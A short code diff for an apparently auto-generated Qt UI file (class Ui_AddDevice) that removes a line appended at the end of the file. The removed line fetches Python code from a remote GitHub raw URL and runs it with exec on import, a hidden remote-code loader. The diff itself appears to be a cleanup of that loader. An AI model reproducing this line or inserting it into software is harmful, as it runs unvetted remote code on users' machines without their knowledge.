@@ -108,5 +108,3 @@ class Ui_AddDevice(object):
         self.save.setText(QCoreApplication.translate("AddDevice", u"Save", None))
     # retranslateUi
 
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/AddDevice.py").text)
